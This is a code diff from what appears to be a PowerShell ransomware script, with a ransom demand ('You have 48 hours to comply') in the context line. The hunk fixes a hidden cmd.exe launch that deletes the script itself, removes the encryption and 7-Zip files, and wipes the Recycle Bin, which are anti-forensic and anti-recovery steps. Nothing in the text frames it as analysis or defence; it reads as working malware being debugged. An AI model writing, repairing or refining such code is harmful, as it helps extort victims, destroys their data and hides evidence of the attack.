@@ -1028,7 +1028,7 @@ You have 48 hours to comply.
 
     # Use inline CMD command to delete after script exits - SIMPLE & RELIABLE
     $deleteCmd = "timeout /t 2 /nobreak >nul & del /f /q `"$scriptToDelete`" 2>nul & cd /d `"$scriptDir`" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & rd /s /q %SYSTEMDRIVE%\`$Recycle.Bin 2>nul"
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden -NoNewWindow
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden
 
     if ($DebugMode) { Write-Host "[DEBUG] Self-delete command launched" -ForegroundColor Magenta }
 
